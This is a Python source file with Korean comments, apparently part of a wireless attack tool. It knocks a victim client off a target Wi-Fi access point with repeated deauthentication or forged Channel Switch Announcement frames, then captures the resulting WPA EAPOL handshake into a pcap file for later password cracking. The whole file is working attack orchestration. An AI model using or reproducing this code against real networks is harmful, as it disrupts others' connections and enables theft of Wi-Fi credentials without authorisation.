import threading
import time
from scapy.all import wrpcap
from cls_collEapol import collEapol 
from cls_collBeacon import collBeacon 
from def_atkDeauth import atkDeauth
from def_atkCSA import atkCSA

clsEapol = collEapol()

def attackThread(vicAddr:str, bssAddr:str, atkOption=0, beaconPkt=''):
# 공격 프레임 전송 스레드
    print('Attack thread enable.')
    global clsEapol
    while(True):
        if atkOption == 1:
            atkDeauth(vicAddr, bssAddr, loopMax=3)
            # 재연결 유도를 위해 Deauth를 3회 전송
        elif atkOption == 2:
            atkCSA(vicAddr, bssAddr, loopMax=3, pkt=beaconPkt)
            # 재연결 유도를 위해 CSA를 3회 전송
        time.sleep(5)
        # 5초 대기
        if False not in clsEapol.collCheck :
        # EAPOL이 모두 수집이 되면 수집 종료
            print('Attack thread disable.')
            return True

def collPkt(bssAddr:str, pcapPath:str, vicAddr='', atkOption=0):
    pktList = []
    clsBeacon = collBeacon()
    clsBeacon.bssid = bssAddr
    clsBeacon.runSniff()
    pktList.append(clsBeacon.pkt)
    # beacon frame 수집

    if (atkOption != 0):
        thread = threading.Thread(target=attackThread, \
            args=(vicAddr, bssAddr, atkOption, clsBeacon.pkt))
        thread.start()
        # Attack Thread 생성
        
    global clsEapol
    clsEapol.bssid = bssAddr
    clsEapol.runSniff()
    pktList += clsEapol.pktList
    wrpcap(pcapPath, pktList)
    # eapol frame 수집

    if vicAddr != '':
        thread.join()
        # Attack Thread 대기
